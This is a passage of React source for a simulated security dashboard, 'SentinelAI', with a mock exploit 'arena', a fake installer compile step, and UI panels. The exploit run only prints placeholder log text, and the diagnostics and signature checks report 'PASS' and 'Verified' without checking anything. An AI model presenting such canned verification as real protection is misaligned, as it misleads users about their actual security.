        compressionRatio: msiCompressionMode === "LZMA" ? "79.4%" : msiCompressionMode === "LZX" ? "61.2%" : "None (0%)",
        sha256: hash,
        timestamp: new Date().toISOString()
      };
      
      setAvCompiledArtifact(finalArtifact);
      setAvCompileLogs(prev => [
        ...prev,
        `[COMPILER] =============================================`,
        `[COMPILER] BUILD SUCCESSFUL`,
        `[COMPILER] Cabinet Compressed Size: ${sizeMb}`,
        `[COMPILER] Signature Hash check: Verified`,
        `[COMPILER] Generated package artifact name: ${fileName}`,
        `[COMPILER] =============================================`
      ]);

      // Add to SIEM live feed
      const timeStr = new Date().toTimeString().split(" ")[0];
      const newSiemLog: SiemFeed = {
        id: `siem-msi-${Date.now()}`,
        timestamp: timeStr,
        source: "SentinelAI-Compiler",
        event: `MSI Compilation Complete: Generated ${fileName} (${sizeMb}) with minimal footprint. Ready for standalone deploy.`,
        severity: "Low",
        type: "SYSTEM_PATCH"
      };
      setSiemEvents(prev => [newSiemLog, ...prev]);

      // Add to Forensic Audit Ledger
      logAuditAction(
        "AV_MSI_COMPILED",
        `Created standalone standalone Windows installer "${fileName}" (${sizeMb}) using ${msiCompressionMode} compression. Default service: "${msiServiceName}".`,
        "Success"
      );
    }, 4000);
  };

  // Interactive Hub Master Cyber Arena Execution Engines
  const executeHubExploitSimulation = () => {
    if (hubOffenseRunning || hubDefenseRunning) return;

    const selectedOffense = INITIAL_HUB_OFFENSES.find(o => o.id === selectedHubOffenseId) || INITIAL_HUB_OFFENSES[0];
    const expectedMitigation = selectedOffense.expectedDefeatedBy;
    const mitigationActive = hubDefensesActive[expectedMitigation] || autoUpdateEnabled;

    setHubOffenseRunning(true);
    setHubActionProgress(0);
    
    setHubTerminalLogs([
      `[ARENA-EXPLOIT-ENGINE] Initializing offensive simulator sequence...`,
      `[ARENA-EXPLOIT-ENGINE] Target: C:\\GitHub\\SentinelAI_Hub_Master\\SandboxCore`,
      `[ARENA-EXPLOIT-ENGINE] Loaded exploit model: ${selectedOffense.name} (${selectedOffense.cve})`,
      `[ARENA-EXPLOIT-ENGINE] Vulnerability Subsystem targeted: ${selectedOffense.subsystem}`,
      `[ARENA-EXPLOIT-ENGINE] Severity Class: ${selectedOffense.severity.toUpperCase()}`
    ]);

    setTimeout(() => {
      setHubActionProgress(30);
      setHubTerminalLogs(prev => [
        ...prev,
        `[ARENA-EXPLOIT-ENGINE] Binding raw socket listeners... Status: LISTENING`,
        `[ARENA-EXPLOIT-ENGINE] Launching shell signature payload: ${selectedOffense.exploitCommand}`
      ]);
    }, 800);

    setTimeout(() => {
      setHubActionProgress(65);
      
      const dbMapping = getOffenseDatabaseName(selectedOffense.id);
      const correspondingDefense = INITIAL_HUB_DEFENSES.find(d => d.id === expectedMitigation) || INITIAL_HUB_DEFENSES[0];

      if (autoUpdateEnabled && !hubDefensesActive[expectedMitigation]) {
        // Trigger autonomous database sync and adapt
        setHubTerminalLogs(prev => [
          ...prev,
          `[ARENA-EXPLOIT-ENGINE] Payload streaming to kernel address offsets:`,
          selectedOffense.exploitPayload,
          `[AUTONOMOUS-ADAPTATION] ────────────────────────────────────────────────────────`,
          `[AUTONOMOUS-ADAPTATION] ⚡ ZERO-DAY BEHAVIOR SIGNATURE RECOGNIZED IN REAL-TIME!`,
          `[AUTONOMOUS-ADAPTATION] 🔍 Querying integrated virus databases... Match found: "${dbMapping}"`,
          `[AUTONOMOUS-ADAPTATION] 🌐 Downloading micro-signatures... Injecting adaptive telemetry streams`,
          `[AUTONOMOUS-ADAPTATION] 🛡️ AUTONOMOUS HEALING: Instantly arming cryptographic shield "${correspondingDefense.name}"`,
          `[AUTONOMOUS-ADAPTATION] ────────────────────────────────────────────────────────`,
          `[ARENA-EXPLOIT-ENGINE] Checking system watchdog counter-measures...`
        ]);

        // Dynamically update the database list to show active synchronization
        setThreatDbs(prevDbs => prevDbs.map(db => {
          if (db.name === dbMapping) {
            return {
              ...db,
              status: "Optimizing" as const,
              signaturesCount: db.signaturesCount + Math.floor(Math.random() * 8) + 2,
              lastUpdated: "Just Now"
            };
          }
          return db;
        }));

        setAdaptiveIntelligenceLogs(prev => [
          `[AUTONOMOUS-SHIELD] [${new Date().toTimeString().split(" ")[0]}] Cyber Arena triggered zero-day anomaly '${selectedOffense.name}'. Adapted by hot-loading updates into '${correspondingDefense.name}'.`,
          ...prev.slice(0, 49)
        ]);

        // Arm defense
        setHubDefensesActive(prev => ({
          ...prev,
          [expectedMitigation]: true
        }));

      } else {
        setHubTerminalLogs(prev => [
          ...prev,
          `[ARENA-EXPLOIT-ENGINE] Payload streaming to kernel address offsets:`,
          selectedOffense.exploitPayload,
          `[ARENA-EXPLOIT-ENGINE] Checking system watchdog counter-measures...`
        ]);
      }
    }, 2000);

    setTimeout(() => {
      setHubActionProgress(100);
      setHubOffenseRunning(false);

      if (mitigationActive) {
        const correspondingDefense = INITIAL_HUB_DEFENSES.find(d => d.id === expectedMitigation) || INITIAL_HUB_DEFENSES[0];
        setHubTerminalLogs(prev => [
          ...prev,
          `[ARENA-EXPLOIT-ENGINE] =============================================`,
          `[ARENA-EXPLOIT-ENGINE] SECURITY EVENT BLOCK TRIGGERED (AUTONOMOUS COGNITIVE SYSTEM)`,
          `[ARENA-EXPLOIT-ENGINE] Active counter-measure detected: "${correspondingDefense.name}"`,
          `[ARENA-EXPLOIT-ENGINE] Cryptographic Algorithm blocking vector: ${correspondingDefense.algorithm}`,
          `[ARENA-EXPLOIT-ENGINE] Attack vector neutralised. System memory structures integrity verified clean.`,
          `[ARENA-EXPLOIT-ENGINE] =============================================`
        ]);

        // Audit Trail Blocked Log
        logAuditAction(
          "EXPLOIT_BLOCKED",
          `Autonomous Adaptive Shield securely blocked "${selectedOffense.name}" exploit targeting "${selectedOffense.subsystem}" using "${correspondingDefense.name}" algorithm parameters.`,
          "Success"
        );
      } else {
        setHubTerminalLogs(prev => [
          ...prev,
          `[ARENA-EXPLOIT-ENGINE] =============================================`,
          `[ARENA-EXPLOIT-ENGINE] WARNING: EXPLOIT SCRIPT EXECUTED UNSHIELDED`,
          `[ARENA-EXPLOIT-ENGINE] Required local shield "${expectedMitigation}" was in STANDBY.`,
          `[ARENA-EXPLOIT-ENGINE] Target environment compromise complete. Virtual LSASS memory or system hives exposed.`,
          `[ARENA-EXPLOIT-ENGINE] =============================================`
        ]);

        // Dynamically compromise an endpoint in the current tenant
        let compromisedHostName = "";
        setEndpoints(prev => {
          const copy = { ...prev };
          const list = copy[tenant] || [];
          const targetNode = list.find(n => n.status !== "Compromised") || list[0];
          if (targetNode) {
            compromisedHostName = targetNode.name;
            copy[tenant] = list.map(n => n.id === targetNode.id ? {
              ...n,
              status: "Compromised" as const,
              mlScore: 99,
              lastScan: "Just now (compromised by exploit)"
            } : n);
          }
          return copy;
        });

        // Security Incident SIEM event
        const timeStr = new Date().toTimeString().split(" ")[0];
        const newSiemLog: SiemFeed = {
          id: `siem-exploit-breach-${Date.now()}`,
          timestamp: timeStr,
          source: "SentinelAI-Arena-Engine",
          event: `UNSHIELDED BREACH INTERFERENCE: Exploit '${selectedOffense.name}' successfully executed against '${selectedOffense.subsystem}'. Host '${compromisedHostName || "Workstation"}' is now COMPROMISED!`,
          severity: "Critical",
          type: "ML_ANOMALY"
        };
        setSiemEvents(prev => [newSiemLog, ...prev]);

        setPanelIncidents(prev => [
          {
            id: `sys-inc-breach-${Date.now()}`,
            title: `BREACH: ${selectedOffense.name}`,
            target: compromisedHostName || "Workstation",
            protocol: selectedOffense.exploitPayload,
            status: "Host compromised in active Arena run.",
            severity: "Critical",
            timestamp: timeStr,
            actionText: "Assess Anomaly Logs",
            presetLogIdx: 2,
            tabKey: "analyst"
          },
          ...prev.slice(0, 9)
        ]);

        // Audit Trail Vulnerable Log
        logAuditAction(
          "EXPLOIT_EXECUTED_UNSHIELDED",
          `Unshielded incident: Exploit "${selectedOffense.name}" passed without active shield defenses. Live host "${compromisedHostName || "endpoint"}" compromised. Critical warning banner triggered!`,
          "Warning"
        );
      }
    }, 4500);
  };

  const executeHubDefenseSimulation = (defenseId: string) => {
    if (hubOffenseRunning || hubDefenseRunning) return;

    setHubDefenseRunning(true);
    setHubActionProgress(0);

    const defenseItem = INITIAL_HUB_DEFENSES.find(d => d.id === defenseId) || INITIAL_HUB_DEFENSES[0];

    setHubTerminalLogs([
      `[ARENA-SHIELD-ENGINE] Initializing local defensive countermeasure integration...`,
      `[ARENA-SHIELD-ENGINE] Selected Mechanism: ${defenseItem.name}`,
      `[ARENA-SHIELD-ENGINE] Verification Standard: C:\\GitHub\\SentinelAI_Hub_Master\\Standards.md`,
      `[ARENA-SHIELD-ENGINE] Running system audit command: ${defenseItem.command}`
    ]);

    setTimeout(() => {
      setHubActionProgress(40);
      setHubTerminalLogs(prev => [
        ...prev,
        `[ARENA-SHIELD-ENGINE] Instantiating security policy layers...`,
        `[ARENA-SHIELD-ENGINE] Running cryptography validation loop. Parsing algorithms: ${defenseItem.algorithm}`
      ]);
    }, 1000);

    setTimeout(() => {
      setHubActionProgress(80);
      setHubTerminalLogs(prev => [
        ...prev,
        `[ARENA-SHIELD-ENGINE] Validating system integrity outputs...`,
        defenseItem.verificationLogs
      ]);
    }, 2200);

    setTimeout(() => {
      setHubActionProgress(100);
      setHubDefenseRunning(false);

      // Toggle state permanently
      setHubDefensesActive(prev => {
        const nextState = { ...prev, [defenseId]: !prev[defenseId] };
        return nextState;
      });

      const nextStatusText = !hubDefensesActive[defenseId] ? "ACTIVE (SHIELD ARMED)" : "STANDBY (UNSHIELDED)";

      setHubTerminalLogs(prev => [
        ...prev,
        `[ARENA-SHIELD-ENGINE] =============================================`,
        `[ARENA-SHIELD-ENGINE] DEFENSE POLICY RECONFIGURED`,
        `[ARENA-SHIELD-ENGINE] Countermeasure Status: ${nextStatusText}`,
        `[ARENA-SHIELD-ENGINE] SentinelAI Hub Master Policy applied. system context strictly validated.`,
        `[ARENA-SHIELD-ENGINE] =============================================`
      ]);

      // Audit Trail defensive state update log
      logAuditAction(
        "SHIELD_POLICY_ALTERED",
        `Altered state of policy shield "${defenseItem.name}". New operational state is: ${nextStatusText}.`,
        "Success"
      );
    }, 3800);
  };

  return (
    <div className="max-w-7xl mx-auto px-4 py-6" id="dashboard-root">
      
      {/* PERSISTENT CRITICAL COMPROMISED HOST ALERTS BANNER */}
      <AnimatePresence>
        {unacknowledgedCompromises.length > 0 && (
          <motion.div
            initial={{ opacity: 0, height: 0, y: -20 }}
            animate={{ opacity: 1, height: "auto", y: 0 }}
            exit={{ opacity: 0, height: 0, y: -20 }}
            transition={{ duration: 0.3, ease: "easeOut" }}
            className="mb-6 overflow-hidden"
            id="critical-compromise-banner"
          >
            <div className="bg-red-950/40 border border-red-500/30 rounded-2xl p-4 md:p-5 relative overflow-hidden flex flex-col md:flex-row md:items-center justify-between gap-5 shadow-lg shadow-red-950/20">
              <div className="absolute top-0 bottom-0 left-0 w-1.5 bg-gradient-to-b from-red-500 to-rose-600 animate-pulse"></div>
              
              <div className="flex items-start gap-3.5 pl-2 relative z-10 w-full md:w-auto">
                <div className="p-2.5 bg-red-500/10 rounded-xl border border-red-500/40 shrink-0 text-red-400 animate-pulse hidden sm:block">
                  <ShieldAlert className="w-6 h-6" />
                </div>

                <div className="w-full">
                  <div className="flex items-center gap-2.5 flex-wrap">
                    <span className="text-[10px] uppercase font-mono font-bold tracking-widest text-red-400 bg-red-500/10 border border-red-500/20 px-2 py-0.5 rounded-full flex items-center gap-1.5">
                      <span className="w-1.5 h-1.5 rounded-full bg-red-500 animate-ping"></span>
                      CRITICAL HOST COMPROMISE OUTBREAK
                    </span>
                    <span className="text-[10px] font-mono text-slate-400">
                      Detected across active threat sandboxes
                    </span>
                  </div>

                  <h2 className="text-sm font-semibold text-slate-100 tracking-tight mt-1.5">
                    {unacknowledgedCompromises.length} {unacknowledgedCompromises.length === 1 ? "Host Event" : "Host Events"} requiring immediate operational acknowledgment
                  </h2>

                  {/* List of endpoints compromised */}
                  <div className="mt-3.5 space-y-2 max-h-[160px] overflow-y-auto pr-2 custom-scrollbar">
                    {unacknowledgedCompromises.map((item) => (
                      <div 
                        key={item.id} 
                        className="flex flex-col sm:flex-row sm:items-center justify-between gap-2.5 p-2 bg-red-950/20 hover:bg-red-950/30 transition border border-red-500/10 rounded-lg text-xs font-mono text-slate-300"
                        id={`banner-item-${item.id}`}
                      >
                        <div className="flex flex-wrap items-center gap-x-2 gap-y-1">
                          <span className="text-red-400 font-bold font-mono">[{item.tenantFriendlyName}]</span>
                          <span className="text-slate-100 font-semibold">{item.name}</span>
                          <span className="text-slate-500 hidden sm:inline">|</span>
                          <span className="text-slate-400">IP: {item.ip}</span>
                          <span className="text-slate-500 hidden sm:inline">|</span>
                          <span className="text-slate-400">OS: {item.os}</span>
                          <span className="text-slate-500 hidden sm:inline">|</span>
                          <span className="text-red-400/90 font-semibold bg-red-500/5 px-1.5 py-0.5 rounded border border-red-500/10">Risk score: {item.mlScore}%</span>
                        </div>

                        <button
                          onClick={() => acknowledgeCompromise(item.id, item.name)}
                          className="bg-red-500/15 hover:bg-red-500/25 text-red-300 border border-red-500/30 hover:border-red-500/40 px-2.5 py-1 rounded text-[10px] font-bold uppercase transition focus:outline-none focus:ring-1 focus:ring-red-500 align-self-start sm:align-self-auto"
                          id={`btn-ack-${item.id}`}
                        >
                          Acknowledge
                        </button>
                      </div>
                    ))}
                  </div>
                </div>
              </div>

              {/* Big Actions */}
              <div className="flex items-center shrink-0 relative z-10 border-t border-red-500/10 md:border-t-0 pt-3 md:pt-0 w-full md:w-auto">
                <button
                  onClick={acknowledgeAllCompromised}
                  className="w-full md:w-auto text-center bg-red-600 hover:bg-red-500 text-white font-sans text-xs px-4 py-2.5 rounded-xl font-semibold shadow-md inline-flex items-center justify-center gap-2 transition hover:shadow-lg focus:outline-none focus:ring-2 focus:ring-red-500"
                  id="btn-ack-all"
                >
                  <Bell className="w-3.5 h-3.5 animate-bounce" />
                  <span>Acknowledge All ({unacknowledgedCompromises.length})</span>
                </button>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Top Navigation & Status Bar */}
      <motion.header 
        initial={{ opacity: 0, y: -10 }}
        animate={{ opacity: 1, y: 0 }}
        className="flex flex-col md:flex-row md:items-center md:justify-between pb-6 mb-6 border-b border-slate-900 gap-y-4"
        id="dashboard-header"
      >
        <div className="flex items-center gap-3">
          <div className="p-3 bg-indigo-600/10 rounded-xl border border-indigo-500/30">
            <Shield className="w-8 h-8 text-indigo-400 animate-pulse" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h1 className="text-2xl font-semibold tracking-tight text-white font-sans">SentinelAI</h1>
              <span className="text-xs bg-indigo-500/10 border border-indigo-500/30 text-indigo-400 font-mono py-0.5 px-2 rounded-full">
                Security Suite (Simulated v4.1)
              </span>
            </div>
            <p className="text-xs text-slate-400 mt-0.5">
              ML-Powered Real-Time Host Protection & Automated Remediation
            </p>
          </div>
        </div>

        {/* Global Control Station: Tenant Selector + RBAC Role Picker */}
        <div className="flex flex-wrap items-center gap-3 bg-slate-900/60 p-2.5 rounded-xl border border-slate-800/80">
          <div className="flex items-center gap-2">
            <Building className="w-4 h-4 text-slate-400" />
            <span className="text-xs text-slate-400 hidden sm:inline">Tenant Context:</span>
            <select
              value={tenant}
              onChange={(e) => handleTenantChange(e.target.value)}
              className="bg-slate-950 font-sans border border-slate-800 rounded-lg text-xs py-1.5 px-3 text-slate-100 focus:outline-none focus:ring-1 focus:ring-indigo-500"
              id="tenant-context-select"
            >
              <option value="acme-prod-corp">🏢 Acme Production Corp (Isolated)</option>
              <option value="stark-labs">🏢 Stark Group Labs (Isolated)</option>
              <option value="initech-apac">🏢 Initech APAC Regional (Isolated)</option>
            </select>
          </div>

          <div className="h-6 w-px bg-slate-800 hidden sm:block"></div>

          <div className="flex items-center gap-2">
            <UserCheck className="w-4 h-4 text-emerald-400" />
            <span className="text-xs text-slate-400 hidden sm:inline">User Role:</span>
            <select
              value={role}
              onChange={(e) => {
                const prevRole = role;
                setRole(e.target.value);
                logAuditAction("ROLE_SWITCH", `User changed session permissions model from ${roleLabel(prevRole)} to ${roleLabel(e.target.value)}`, "Success");
              }}
              className="bg-slate-950 font-sans border border-slate-800 rounded-lg text-emerald-400 text-xs py-1.5 px-3 font-medium focus:outline-none focus:ring-1 focus:ring-emerald-500"
              id="rbac-role-select"
            >
              <option value="SecOps-Admin" className="text-red-400">🛡️ SecOps Admin (Full Write)</option>
              <option value="Compliance-Auditor" className="text-cyan-400">👁️ Compliance Auditor (Read-Only)</option>
              <option value="Helpdesk-Operator" className="text-amber-400">🛠️ Helpdesk Operator (Scan Only)</option>
            </select>
          </div>
        </div>
      </motion.header>

      {/* Cloud-Native Overview Widgets */}
      <div className="grid grid-cols-2 md:grid-cols-5 gap-4 mb-6" id="dashboard-widgets">
        <div className="bg-slate-900/40 border border-slate-800/80 rounded-xl p-4 flex flex-col justify-between" id="metric-total-active">
          <div className="flex justify-between items-center text-slate-400 mb-2">
            <span className="text-xs font-medium tracking-wider uppercase">Active Nodes</span>
            <Network className="w-4 h-4 text-indigo-400" />
          </div>
          <div>
            <h3 className="text-3xl font-mono font-bold text-white leading-none mt-1">{metrics.total}</h3>
            <p className="text-slate-500 text-[10px] mt-1.5 font-mono">Agent Version: v4.12.1</p>
          </div>
        </div>

        <div className="bg-slate-900/40 border border-slate-800/80 rounded-xl p-4 flex flex-col justify-between" id="metric-secure">
          <div className="flex justify-between items-center text-slate-400 mb-2">
            <span className="text-xs font-medium tracking-wider uppercase">Secure Stats</span>
            <ShieldCheck className="w-4 h-4 text-emerald-500" />
          </div>
          <div>
            <div className="flex items-baseline gap-2">
              <h3 className="text-3xl font-mono font-bold text-emerald-400 leading-none mt-1">{metrics.secure}</h3>
              <span className="text-xs text-slate-500 font-mono">/{metrics.total}</span>
            </div>
            <div className="w-full bg-slate-850 h-1.5 rounded-full mt-2 overflow-hidden">
              <div 
                className="bg-emerald-500 h-full rounded-full transition-all duration-500" 
                style={{ width: `${(metrics.secure / metrics.total) * 100}%` }}
              ></div>
            </div>
          </div>
        </div>

        <div className="bg-slate-900/40 border border-slate-800/80 rounded-xl p-4 flex flex-col justify-between" id="metric-vulnerable">
          <div className="flex justify-between items-center text-slate-200 mb-2">
            <span className="text-xs text-slate-400 font-medium tracking-wider uppercase">Pending CVEs</span>
            <AlertTriangle className="w-4 h-4 text-amber-500" />
          </div>
          <div>
            <h3 className={`text-3xl font-mono font-bold leading-none mt-1 ${metrics.vulnerable > 0 ? "text-amber-400 animate-pulse" : "text-slate-450"}`}>
              {metrics.vulnerable}
            </h3>
            <p className="text-slate-500 text-[10px] mt-1.5 font-mono">Requires Hotfix Patch</p>
          </div>
        </div>

        <div className="bg-slate-900/40 border border-slate-800/80 rounded-xl p-4 flex flex-col justify-between" id="metric-compromised">
          <div className="flex justify-between items-center text-slate-400 mb-2">
            <span className="text-xs font-medium tracking-wider uppercase">Compromised</span>
            <ShieldAlert className="w-4 h-4 text-red-500" />
          </div>
          <div>
            <h3 className={`text-3xl font-mono font-bold leading-none mt-1 ${metrics.compromised > 0 ? "text-red-500 animate-pulse" : "text-slate-550"}`}>
              {metrics.compromised}
            </h3>
            <p className="text-slate-500 text-[10px] mt-1.5 font-mono">Isolated Host State</p>
          </div>
        </div>

        <div className="col-span-2 md:col-span-1 bg-slate-900/40 border border-slate-800/80 rounded-xl p-4 flex flex-col justify-between" id="metric-risk-score">
          <div className="flex justify-between items-center text-slate-400 mb-2">
            <span className="text-xs font-medium tracking-wider uppercase">ML Risk Index</span>
            <Activity className="w-4 h-4 text-cyan-400" />
          </div>
          <div>
            <div className="flex items-baseline gap-1">
              <h3 className={`text-3xl font-mono font-bold leading-none mt-1 ${metrics.avgScore > 50 ? "text-red-400" : metrics.avgScore > 20 ? "text-amber-400" : "text-emerald-400"}`}>
                {metrics.avgScore}
              </h3>
              <span className="text-xs text-slate-500 font-mono">/100</span>
            </div>
            <p className="text-slate-500 text-[10px] mt-1.5 font-mono">Entropy Vector Anomaly</p>
          </div>
        </div>
      </div>

      {/* Real-Time System Integrity & Diagnostics Command Center */}
      <motion.div 
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        className="bg-slate-900/40 border border-slate-800/80 rounded-2xl p-4 mb-6"
        id="realtime-diagnostics-bar"
      >
        <div className="flex flex-col md:flex-row md:items-center justify-between pb-3 mb-4 border-b border-slate-850 gap-y-2">
          <div className="flex items-center gap-2">
            <span className="relative flex h-2 w-2">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
              <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
            </span>
            <div>
              <h2 className="text-xs font-bold text-slate-200 uppercase tracking-wider font-mono">
                System Diagnostics Monitor & Real-Time Integrity Checks
              </h2>
              <p className="text-[10px] text-slate-500 mt-0.5">
                Active security validation loops tracking kernel sandbox status, AI weight drift, compliance adherence, and threat database synchronization.
              </p>
            </div>
          </div>

          <div className="flex items-center gap-3">
            <div className="text-[10px] font-mono text-slate-400 bg-slate-950/60 py-1 px-2.5 rounded border border-slate-800">
              <span className="text-slate-500">Last Pulse Check:</span> <span className="text-emerald-400 font-bold">{lastCheckPulse}</span>
            </div>

            <button
              onClick={() => {
                if (isDiagnosticScanRunning) return;
                setIsDiagnosticScanRunning(true);
                logAuditAction("MANUAL_DIAGNOSTICS_RUN", "User initiated a complete real-time host-level diagnostic sweep.", "Success");
                
                // Set all checks to CHECKING sequentially
                let delay = 0;
                systemChecks.forEach((check, index) => {
                  setTimeout(() => {
                    setSystemChecks(prev => prev.map((chk, idx) => {
                      if (idx === index) {
                        return {
                          ...chk,
                          status: "CHECKING",
                          details: "Executing full sandbox checksum validation sequence..."
                        };
                      }
                      return chk;
                    }));
                  }, delay);
                  delay += 400;
                });

                // Set them back to PASS with refreshed details
                systemChecks.forEach((check, index) => {
                  setTimeout(() => {
                    const verifiedReports = [
                      "Integrity baseline strictly matched. Verified secure.",
                      "ML anomaly prediction coefficient calibrated (drift: <0.01%)",
                      "Cryptographic nonces logged to ledger securely.",
                      "Synchronized perfectly with decentralised global servers.",
                      "Host virtual registers safe from buffer leaks.",
                      "Dynamic policies aligned with SOC2 secure policies."
                    ];
                    setSystemChecks(prev => prev.map((chk, idx) => {
                      if (idx === index) {
                        return {
                          ...chk,
                          status: "PASS",
                          lastChecked: new Date().toTimeString().split(" ")[0],
                          details: verifiedReports[index]
                        };
                      }
                      return chk;
                    }));
                  }, delay + 800);
                  delay += 300;
                });

                setTimeout(() => {
                  setIsDiagnosticScanRunning(false);
                  setLastCheckPulse(new Date().toTimeString().split(" ")[0]);
                }, delay + 1200);
              }}
              disabled={isDiagnosticScanRunning}
              className={`text-[10px] font-mono py-1 px-3 rounded-lg border font-semibold transition flex items-center gap-1.5 leading-none ${
                isDiagnosticScanRunning
                  ? "bg-slate-900 border-slate-850 text-slate-650 cursor-not-allowed"
                  : "bg-indigo-600/15 hover:bg-indigo-600/35 text-indigo-400 border-indigo-500/30 font-semibold"
              }`}
              id="btn-run-diagnostics"
            >
              <RefreshCw className={`w-3 h-3 ${isDiagnosticScanRunning ? "animate-spin" : ""}`} />
              <span>{isDiagnosticScanRunning ? "Scanning Base registers..." : "Force Full System Diagnostics Sync"}</span>
            </button>
          </div>
        </div>

        <div className="grid grid-cols-2 md:grid-cols-6 gap-3">
          {systemChecks.map((check) => {
            const isChecking = check.status === "CHECKING";
            return (
              <div
                key={check.id}
                className={`p-3 rounded-xl border relative transition-all duration-250 ${
                  isChecking
                    ? "bg-indigo-950/10 border-indigo-500/40 shadow-sm shadow-indigo-950/10"
                    : "bg-slate-950/40 border-slate-850/80 hover:border-slate-800"
                }`}
                id={`check-card-${check.id}`}
              >
                <div className="flex items-center justify-between gap-1 border-b border-slate-900/50 pb-2 mb-2">
                  <span className="text-[9px] font-mono font-bold text-slate-500 truncate block uppercase">
                    {check.category}
                  </span>
                  
                  <span className={`text-[8px] font-mono py-0.5 px-1.5 rounded-sm shrink-0 uppercase tracking-wider font-bold inline-flex items-center gap-1 leading-none ${
                    check.status === "PASS"
                      ? "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20"
                      : "bg-indigo-500/10 text-indigo-400 border border-indigo-500/20 animate-pulse"
                  }`}>
                    <span className={`w-1 h-1 rounded-full ${check.status === "PASS" ? "bg-emerald-400" : "bg-indigo-400 animate-ping"}`}></span>
                    {check.status}
                  </span>
                </div>

                <h4 className="font-semibold text-slate-200 text-[11px] leading-tight truncate" title={check.name}>
                  {check.name}
                </h4>
                
                <p className="text-[10px] text-slate-400 mt-1.5 leading-snug line-clamp-2 h-[28px]" title={check.details}>
                  {check.details}
                </p>

                <div className="flex items-center justify-between text-[9px] text-slate-500 font-mono mt-2 pt-2 border-t border-slate-900/30">
                  <span>Last check:</span>
                  <span className="text-slate-400 font-bold">{check.lastChecked}</span>
                </div>

                {isChecking && (
                  <div className="absolute bottom-0 left-0 right-0 h-[2px] bg-gradient-to-r from-cyan-500 via-indigo-500 to-indigo-600 animate-shimmer" style={{ backgroundSize: "200% auto" }}></div>
                )}
              </div>
            );
          })}
        </div>
      </motion.div>

      {/* Main Panel - Split Layout */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6" id="dashboard-body">
        
        {/* LEFT COLUMN: ACTIVE CONTROL WINDOWS (8 COLS) */}
        <div className="lg:col-span-8 flex flex-col gap-6">
          
          {/* Navigation Bar inside Body */}
          <div className="flex justify-between items-center bg-slate-900/50 p-2 rounded-xl border border-slate-800" id="sub-navigation">
            <div className="flex flex-wrap gap-1.5">
              <button
                onClick={() => setActiveTab("endpoints")}
                className={`flex items-center gap-2 px-3 py-2 rounded-lg text-xs font-medium transition ${
                  activeTab === "endpoints" 
                    ? "bg-indigo-600 text-white shadow-soft" 
                    : "text-slate-400 hover:text-slate-200 hover:bg-slate-850"
                }`}
                id="tab-btn-endpoints"
              >
                <Network className="w-3.5 h-3.5" />
                Network Endpoints
              </button>

              <button
                onClick={() => setActiveTab("siem")}
                className={`flex items-center gap-2 px-3 py-2 rounded-lg text-xs font-medium transition ${
                  activeTab === "siem" 
                    ? "bg-indigo-600 text-white shadow-soft" 
                    : "text-slate-400 hover:text-slate-200 hover:bg-slate-850"
                }`}
                id="tab-btn-siem"
              >
                <Terminal className="w-3.5 h-3.5" />
                SIEM Analyzer Fed
              </button>

              <button
                onClick={() => setActiveTab("analyst")}
                className={`flex items-center gap-2 px-3 py-2 rounded-lg text-xs font-medium transition ${
                  activeTab === "analyst" 
                    ? "bg-indigo-600 text-white shadow-soft" 
                    : "text-slate-400 hover:text-slate-200 hover:bg-slate-850"
                }`}
                id="tab-btn-analyst"
              >
                <Sparkles className="w-3.5 h-3.5 text-indigo-300" />
                AI Threat Command
              </button>

              <button
                onClick={() => setActiveTab("compliance")}
                className={`flex items-center gap-2 px-3 py-2 rounded-lg text-xs font-medium transition ${
                  activeTab === "compliance" 
                    ? "bg-indigo-600 text-white shadow-soft" 
                    : "text-slate-400 hover:text-slate-200 hover:bg-slate-850"
                }`}
                id="tab-btn-compliance"
              >
                <FileCheck className="w-3.5 h-3.5" />
                IT Audit Readiness
              </button>

              <button
                onClick={() => setActiveTab("ledger")}
                className={`flex items-center gap-2 px-3 py-2 rounded-lg text-xs font-medium transition ${
                  activeTab === "ledger" 
                    ? "bg-indigo-600 text-white shadow-soft" 
                    : "text-slate-400 hover:text-slate-200 hover:bg-slate-850"
                }`}
                id="tab-btn-ledger"
              >
                <History className="w-3.5 h-3.5" />
                Audit Trail Ledger
              </button>

              <button
                onClick={() => setActiveTab("arsenal")}
                className={`flex items-center gap-2 px-3 py-2 rounded-lg text-xs font-medium transition ${
                  activeTab === "arsenal" 
                    ? "bg-indigo-600 text-white shadow-soft" 
                    : "text-slate-400 hover:text-slate-200 hover:bg-slate-850"
                }`}
                id="tab-btn-arsenal"
              >
                <ShieldCheck className="w-3.5 h-3.5 text-emerald-400 animate-pulse" />
                Mitigation Arsenal (10x)
              </button>

              <button
                onClick={() => setActiveTab("antivirus")}
                className={`flex items-center gap-2 px-3 py-2 rounded-lg text-xs font-medium transition ${
                  activeTab === "antivirus" 
                    ? "bg-indigo-600 text-white shadow-soft" 
                    : "text-slate-400 hover:text-slate-200 hover:bg-slate-850"
                }`}
                id="tab-btn-antivirus"
              >
                <Cpu className="w-3.5 h-3.5 text-indigo-400" />
                Windows Standalone AV (MSI)
              </button>

              <button
                onClick={() => setActiveTab("hubmaster")}
                className={`flex items-center gap-2 px-3 py-2 rounded-lg text-xs font-medium transition ${
                  activeTab === "hubmaster" 
                    ? "bg-indigo-600 text-white shadow-soft" 
                    : "text-slate-400 hover:text-slate-200 hover:bg-slate-850"
                }`}
                id="tab-btn-hubmaster"
              >
                <Sparkles className="w-3.5 h-3.5 text-yellow-400 animate-spin" style={{ animationDuration: "3s" }} />
                Cyber Arena (Hub Master)
              </button>

              <button
                onClick={() => setActiveTab("threatintelligence")}
                className={`flex items-center gap-2 px-3 py-2 rounded-lg text-xs font-medium transition ${
                  activeTab === "threatintelligence" 
                    ? "bg-indigo-600 text-white shadow-soft" 
                    : "text-slate-400 hover:text-slate-200 hover:bg-slate-850"
                }`}
                id="tab-btn-threatintelligence"
              >
                <Database className="w-3.5 h-3.5 text-cyan-400 animate-pulse" />
                Autonomous Threat Intelligence
              </button>
            </div>

            {/* Global healing and scan indicators */}
            {activeTab === "endpoints" && (
              <button
                onClick={triggerTenantWidePatch}
                disabled={role !== "SecOps-Admin"}
                className={`text-xs flex items-center gap-1.5 transition py-1.5 px-3 rounded-lg border leading-none ${
                  role === "SecOps-Admin"
